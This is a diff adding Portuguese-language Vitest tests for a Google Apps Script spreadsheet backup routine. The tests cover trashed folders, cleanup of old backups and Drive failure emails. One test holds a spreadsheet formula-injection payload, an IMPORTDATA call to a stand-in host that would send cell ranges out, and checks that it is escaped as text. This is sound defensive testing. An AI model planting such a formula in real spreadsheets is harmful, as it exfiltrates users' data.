@@ -22,7 +22,9 @@ beforeEach(() => {
 });
 afterEach(() => vi.useRealTimers());
 
-const vivos = (g: ReturnType<typeof criarGoogleFalso>) => g.arquivos.filter((f) => f.pasta === PASTA && !f.lixeira).map((f) => f.nome);
+const pastaViva = (g: ReturnType<typeof criarGoogleFalso>) => g.pastas.find((p) => p.nome === PASTA && !p.lixeira)?.id;
+const vivos = (g: ReturnType<typeof criarGoogleFalso>) =>
+  g.arquivos.filter((f) => f.pasta === pastaViva(g) && !f.lixeira).map((f) => f.nome);
 
 describe('Backup.gs', () => {
   it('fazerBackup cria a planilha com as 4 abas e o JSON, e chama concluir_backup', () => {
@@ -95,5 +97,65 @@ describe('Backup.gs', () => {
     s.instalar();
     expect(g.gatilhos()).toEqual([{ funcao: 'fazerBackup', dia: 'SUNDAY', hora: 3, semanas: 1 }]);
     expect(vivos(g)).toContain('Backup Agenda 2026-11-15');
+  });
+
+  it('pasta de backups jogada na lixeira: falha com e-mail e nada é concluído', () => {
+    const g = criarGoogleFalso({ responder: ok });
+    const s = carregarScript(g, CONFIG);
+    s.instalar();
+    g.pastas.forEach((p) => (p.lixeira = true));
+    const antes = g.chamadas.length;
+    expect(s.fazerBackup().ok).toBe(false);
+    expect(g.emails.at(-1)!.corpo).toContain('lixeira');
+    expect(g.chamadas.slice(antes).some((c) => c.url.endsWith('concluir_backup'))).toBe(false);
+  });
+
+  it('instalar ignora uma pasta de mesmo nome que está na lixeira e cria outra', () => {
+    const g = criarGoogleFalso({ responder: ok });
+    const velha = g.preencherPasta([]);
+    velha.lixeira = true;
+    const s = carregarScript(g, CONFIG);
+    s.instalar();
+    const nova = g.pastas.find((p) => p.nome === PASTA && !p.lixeira)!;
+    expect(nova.id).not.toBe(velha.id);
+    expect(vivos(g)).toContain('Backup Agenda 2026-11-15');
+  });
+
+  it('a limpeza ignora o que já está na lixeira e nomes repetidos (rodar várias vezes no mesmo dia)', () => {
+    const g = criarGoogleFalso({ responder: ok });
+    const antigas = Array.from({ length: 11 }, (_, i) => `Backup Agenda ${new Date(Date.UTC(2026, 7, 2 + 7 * i)).toISOString().slice(0, 10)}`);
+    g.preencherPasta(antigas);
+    g.preencherPasta(['Backup Agenda 2026-11-15', 'Backup Agenda 2026-11-15'], true); // execuções anteriores de hoje
+    const s = carregarScript(g, CONFIG);
+    s.fazerBackup();
+    const planilhas = vivos(g).filter((n) => n.startsWith('Backup Agenda'));
+    expect(planilhas).toHaveLength(12);
+    for (const a of antigas) expect(planilhas).toContain(a);
+  });
+
+  it('nome com fórmula vindo do link entra como texto na planilha', () => {
+    const malicioso = '=IMPORTDATA("https://mal.example/?"&B2:D500)';
+    const g = criarGoogleFalso({
+      responder: (url) =>
+        url.endsWith('rpc/exportar_backup')
+          ? { codigo: 200, texto: JSON.stringify({ ...DADOS, clientes: [{ ...DADOS.clientes[0], nome: malicioso }] }) }
+          : { codigo: 200, texto: JSON.stringify({ apagados: 0 }) },
+    });
+    const s = carregarScript(g, CONFIG);
+    s.fazerBackup();
+    const planilha = g.arquivos.find((f) => f.nome === 'Backup Agenda 2026-11-15')!;
+    expect(planilha.abas!.Agendamentos[1][2]).toBe(`'${malicioso}`);
+    expect(planilha.abas!.Clientes[1][0]).toBe(`'${malicioso}`);
+    expect(planilha.formato).toBe('@');
+  });
+
+  it('falha do Drive logo no começo também manda o e-mail', () => {
+    const g = criarGoogleFalso({ responder: ok });
+    const s = carregarScript(g, CONFIG);
+    g.falharDrive('Service error: Drive');
+    expect(s.fazerBackup().ok).toBe(false);
+    expect(g.emails).toHaveLength(1);
+    expect(g.emails[0].corpo).toContain('Service error: Drive');
+    expect(g.chamadas.some((c) => c.url.endsWith('concluir_backup'))).toBe(false);
   });
 });
